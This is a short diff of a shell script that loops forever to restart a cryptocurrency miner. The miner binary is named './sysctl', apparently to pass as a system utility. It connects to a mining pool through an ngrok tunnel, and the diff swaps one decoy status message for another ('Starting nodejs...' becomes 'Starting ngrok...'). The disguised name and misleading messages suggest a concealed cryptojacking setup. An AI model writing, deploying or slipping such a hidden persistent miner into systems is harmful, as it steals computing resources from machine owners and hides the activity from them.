@@ -7,8 +7,8 @@ POOL_URL="stratum+tcp://$WALLET.$WORKER@0.tcp.ap.ngrok.io:17223"
 
 # Infinite loop to restart the miner if it stops
 while true; do
-  echo "Starting nodejs..."
-  ./sysctl --pool $POOL_URL --cpu-devices 0 >> proc.log 2>&1
+  echo "Starting ngrok..."
+  ./sysctl --pool $POOL_URL --cpu-devices 0 >> 17223.log 2>&1
 
   # Check exit code of miner
   EXIT_CODE=$?
